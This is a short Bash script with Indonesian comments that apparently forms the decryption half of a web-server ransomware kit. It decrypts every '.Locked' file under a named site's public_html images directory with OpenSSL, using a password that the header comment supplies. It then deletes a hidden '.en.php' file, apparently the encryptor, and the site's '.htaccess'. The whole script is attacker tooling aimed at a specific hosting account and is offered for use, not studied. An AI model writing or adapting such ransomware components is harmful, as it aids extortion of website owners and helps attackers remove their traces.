#sed -i 's/\r//' den.sh
#bash den.sh @rijal@123
#!/bin/bash

# Fungsi untuk mendekripsi file
decfile() {
    local file=$1
    local pass=$2
    if [ -f "$file" ]; then
        # Menggunakan OpenSSL untuk mendekripsi file dengan password yang diberikan
        openssl enc -d -aes-256-cbc -in "$file" -out "${file%.Locked}" -pass pass:"$pass" && rm "$file"
        echo "🔓 $file File Telah Unlocked🔓"
    fi
}

# Fungsi untuk mendekripsi seluruh isi direktori
decdir() {
    local dir=$1
    local pass=$2
    # Mencari seluruh file dengan ekstensi .Locked dalam direktori (termasuk subdirektori)
    find "$dir" -type f -name "*.Locked" | while read -r file; do
        decfile "$file" "$pass"
    done
}

# Memeriksa apakah password diberikan melalui input
if [ -z "$1" ]; then
    echo "Password harus diberikan sebagai argumen."
    exit 1
fi

# Password untuk dekripsi
password=$1

# Direktori target
target_dir="/home/gettsbd/public_html/public/images/team/"

# Menjalankan dekripsi untuk seluruh direktori
decdir "$target_dir" "$password"

# Menghapus file index.php dan .htaccess, jika ada
if [ -f "$target_dir/.en.php" ]; then
    rm "$target_dir/.en.php"
    echo "✅ .en.php telah dihapus"
else
    echo "❌ .en.php tidak ditemukan"
fi

if [ -f "$target_dir/.htaccess" ]; then
    rm "$target_dir/.htaccess"
    echo "✅ .htaccess telah dihapus"
else
    echo "❌ .htaccess tidak ditemukan"
fi

echo "🔓Unlocked selesai🔓"
 